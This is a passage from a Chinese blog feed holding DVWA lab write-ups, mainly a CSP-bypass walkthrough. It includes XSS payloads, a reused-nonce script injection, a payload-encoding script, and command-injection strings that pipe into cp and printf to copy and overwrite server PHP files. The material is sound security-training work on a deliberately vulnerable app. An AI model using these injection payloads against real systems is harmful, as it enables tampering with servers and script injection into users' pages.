&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;send&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;click&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">token_part_3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">token_part_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ABCD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">44&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>按执行顺序排列一下。&lt;/p>
&lt;ol>
&lt;li>把&lt;code>phrase&lt;/code>置空。&lt;/li>
&lt;li>执行&lt;code>token_part_1&lt;/code>，此时 &lt;code>token&lt;/code> 值是 &lt;code>reverse(phrase)&lt;/code>。&lt;/li>
&lt;li>延迟执行&lt;code>token_part_2&lt;/code>，此时 &lt;code>token&lt;/code> 值是 &lt;code>sha256(&amp;quot;YY&amp;quot;+reverse(phrase))&lt;/code>。&lt;/li>
&lt;li>点击时执行&lt;code>token_part_3&lt;/code>，此时 &lt;code>token&lt;/code> 值是 &lt;code>sha256(&amp;quot;YY&amp;quot;+sha256(reverse(phrase))+&amp;quot;ZZ&amp;quot;)&lt;/code>。&lt;/li>
&lt;/ol>
&lt;p>所以我们要做的只有输入&lt;code>success&lt;/code>，调用 &lt;code>token_part_1&lt;/code>和&lt;code>token_part_2&lt;/code>，然后点击按钮。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nx">token_part_1&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">token_part_2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;XX&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429115443530.png"
width="439"
height="170"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429115443530_hu4f8c6fa8faf717541eb4ee43bbb73e6d_11270_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429115443530_hu4f8c6fa8faf717541eb4ee43bbb73e6d_11270_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429115443530"
class="gallery-image"
data-flex-grow="258"
data-flex-basis="619px"
>&lt;/p>
&lt;p>完成。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>前端逆向不是我擅长的领域，不过还好 High 难度的 js 逆向还能应付得过来。&lt;/p>
&lt;p>过程里发现自己有个非常糟糕的问题，粗心大意。此外就是js逆向功底不太行，尝试分析&lt;code>eval&lt;/code>里那个函数，发现除了人肉分析就没有什么别的主意了。如果没分析出来就只能寄，分析太慢也没有办法。但是过去看大佬们搞js逆向的时候都有用babel之类的工具，这方面还需要加强。&lt;/p>
&lt;p>以上，结束。&lt;/p></description></item><item><title>DVWA上手记录-CSP BYPASS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-12/</link><pubDate>Fri, 29 Apr 2022 12:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-12/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。&lt;/p>
&lt;p>直接开干吧。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>CSP 是 &lt;em>Content Security Policy&lt;/em> ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 &lt;code>&amp;lt;script src=&amp;quot;...&amp;quot;&lt;/code>、&lt;code>&amp;lt;img src=&amp;quot;...&amp;quot;&lt;/code> 这样的外部来源。&lt;/p>
&lt;p>比如说，设置 &lt;code>Content-Security-Policy: script-src 'self'&lt;/code> 就会约束脚本&lt;code>src&lt;/code>必须和当前页面同源。&lt;/p>
&lt;p>&lt;code>Content-Security-Policy&lt;/code> 支持的策略非常多，懒得一一列举了，常见的有 &lt;code>default-src&lt;/code> 、&lt;code>script-src&lt;/code> 这些。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low收集信息">Low：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687.png"
width="675"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429091729687"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="551px"
>&lt;/p>
&lt;p>看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350.png"
width="1905"
height="77"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429091905350"
class="gallery-image"
data-flex-grow="2474"
data-flex-basis="5937px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">Refused to load the script &amp;#39;http://172.17.0.1:8000/1.js&amp;#39; because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;self&amp;#39; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&amp;#34;. Note that &amp;#39;script-src-elem&amp;#39; was not explicitly set, so &amp;#39;script-src&amp;#39; is used as a fallback.
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>设置了&lt;code>script-src&lt;/code>策略，注意到策略里允许了 &lt;code>pastebin&lt;/code>、&lt;code>hastebin&lt;/code>、&lt;code>toptal&lt;/code> 这些网站。&lt;/p>
&lt;h3 id="low解题">Low：解题&lt;/h3>
&lt;p>在 &lt;code>hastebin.com&lt;/code> 写一句 &lt;code>alert(1)&lt;/code> ，保存并取纯文本链接，然后贴到这里。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962.png"
width="1028"
height="179"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429092314962"
class="gallery-image"
data-flex-grow="574"
data-flex-basis="1378px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="medium收集信息">Medium：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248.png"
width="689"
height="281"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429092433248"
class="gallery-image"
data-flex-grow="245"
data-flex-basis="588px"
>&lt;/p>
&lt;p>提示不管写什么都会直接丢到这里，看你能不能弹出个&lt;code>alert&lt;/code>。&lt;/p>
&lt;p>尝试写一个&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，发现出错：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">Refused to execute inline script because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;self&amp;#39; &amp;#39;unsafe-inline&amp;#39; &amp;#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&amp;#39;&amp;#34;. Note that &amp;#39;unsafe-inline&amp;#39; is ignored if either a hash or nonce value is present in the source list.
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>提示CSP禁止了inline脚本，但后面备注&lt;code>unsafe-inline&lt;/code>会在源列表里有&lt;code>hash&lt;/code>和&lt;code>nonce&lt;/code>的情况下忽略。&lt;/p>
&lt;h3 id="medium解题">Medium：解题&lt;/h3>
&lt;p>尝试在 payload 上加上 &lt;code>nonce&lt;/code>：&lt;code>&amp;lt;script nonce&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，错误不变。&lt;/p>
&lt;p>加上 &lt;code>src&lt;/code>，随便选一个真实存在的 js：&lt;code>&amp;lt;script src=&amp;quot;/dvwa/js/dvwaPage.js&amp;quot; nonce&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，错误消失。但脚本没有执行。无奈看了下帮助，提示注意 CSP 的 &lt;code>nonce&lt;/code> 策略。于是翻了下请求历史，发现 &lt;code>nonce&lt;/code> 不变。&lt;/p>
&lt;p>于是修改 payload，&lt;code>nonce&lt;/code> 设置为固定值：&lt;code>&amp;lt;script nonce=&amp;quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&amp;quot;&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302.png"
width="1004"
height="183"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429093610302"
class="gallery-image"
data-flex-grow="548"
data-flex-basis="1316px"
>&lt;/p>
&lt;p>需要注意的是 &lt;code>nonce-&lt;/code> 这个前缀不用放到 &lt;code>script&lt;/code> 标签的 &lt;code>nonce&lt;/code> 里。&lt;/p>
&lt;h3 id="high收集信息">High：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904.png"
width="679"
height="314"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429093750904"
class="gallery-image"
data-flex-grow="216"
data-flex-basis="518px"
>&lt;/p>
&lt;p>点击&lt;code>Solve the sum&lt;/code>后：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724.png"
width="146"
height="68"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429093808724"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="515px"
>&lt;/p>
&lt;p>提示是修改指定的页面来运行自己的代码，怪。这要怎么做？没思路了，看一眼帮助，并没有帮助。&lt;/p>
&lt;p>这一次的 &lt;code>Content-Security-Policy&lt;/code>是&lt;code>script-src 'self'&lt;/code>，点击&lt;code>Solve the sum&lt;/code>产生请求&lt;code>jsonp.php?callback=solveSum&lt;/code>。返回结果是一个 js 脚本。审阅代码没有包含 &lt;code>jsonp.php&lt;/code> 的内容。&lt;/p>
&lt;p>好吧。先试试请求 &lt;code>jsonp.php&lt;/code>，改一下&lt;code>callback&lt;/code>参数，请求&lt;code>http://localhost:8080/vulnerabilities/csp/source/jsonp.php?alert&lt;/code>。结果返回一个空页面，没有js。所以提示还是对的，只能改&lt;code>jsonp.php&lt;/code>文件完成High难度。&lt;/p>
&lt;p>改法可以很简单=。=我们先拿命令注入提取出&lt;code>jsonp.php&lt;/code>文件，方便下载。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">n|cp /var/www/html/vulnerabilities/csp/source/jsonp.php /var/www/html/jsonp.txt
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后访问&lt;code>/jsonp.txt&lt;/code>拿到内容：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="nx">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Type: application/json; charset=UTF-8&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">array_key_exists&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;callback&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$callback&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;callback&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nv">$outp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s2">&amp;#34;15&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="nv">$callback&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;(&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">json_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$outp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;)&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>emm，没什么特别的，接着看下前端怎么处理 &lt;code>jsonp.php&lt;/code> 返回的内容。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">function&lt;/span> &lt;span class="nx">clickButton&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createElement&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;source/jsonp.php?callback=solveSum&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">appendChild&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">solveSum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;answer&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">solve_button&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;solve&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">solve_button&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">solve_button&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;click&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">clickButton&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重点来了：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createElement&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;source/jsonp.php?callback=solveSum&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">appendChild&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接把 &lt;code>jsonp.php&lt;/code> 返回的内容当成了 &lt;code>script&lt;/code> 标签的内容，也就是在 &lt;code>jsonp.php&lt;/code> 返回随便什么东西前端都会执行。&lt;/p>
&lt;p>那下一步就容易了，利用命令注入漏洞注入一个新的 php 标签，并输出 &lt;code>alert&lt;/code>。先写一个脚本把脚本编码成&lt;code>printf&lt;/code> 接受的8进制转义。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">encoded&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php echo &lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">alert(1)&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">; ?&amp;gt;&amp;#39;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s1">&amp;#39;()&amp;amp;|-$`;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">encoded&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">0&lt;/span>&lt;span class="si">{:o}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">encoded&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">c&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到结果之后，变形一下payload：&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;&amp;gt;/var/www/html/jsonp.txt&lt;/code>。执行后检查：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056.png"
width="327"
height="56"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429103150056"
class="gallery-image"
data-flex-grow="583"
data-flex-basis="1401px"
>&lt;/p>
&lt;p>再真正注入到 &lt;code>jsonp.php&lt;/code> 里。&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;&amp;gt;/var/www/html/vulnerabilities/csp/source/jsonp.php&lt;/code>，返回后发现有语法错误。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118.png"
width="300"
height="59"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429103315118"
class="gallery-image"
data-flex-grow="508"
data-flex-basis="1220px"
>&lt;/p>
&lt;p>是我大意了=。=算了，直接覆盖掉 &lt;code>jsonp.php&lt;/code> 完事。&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;/var/www/html/vulnerabilities/csp/source/jsonp.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845.png"
width="819"
height="209"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429103448845"
class="gallery-image"
data-flex-grow="391"
data-flex-basis="940px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>一定要总结的话就是确实有黑客思维这回事。题目并不是真的在考一个固定知识点，虽然是在CSP题，但真正的关键工作是在命令注入完成的，只是观察CSP这个页面的话是什么也干不成的，即使没有 CSP 干瞪着这个页面也干不成，就算有创建&lt;code>script&lt;/code>标签设置内容的&lt;code>js&lt;/code>也利用不到。&lt;/p>
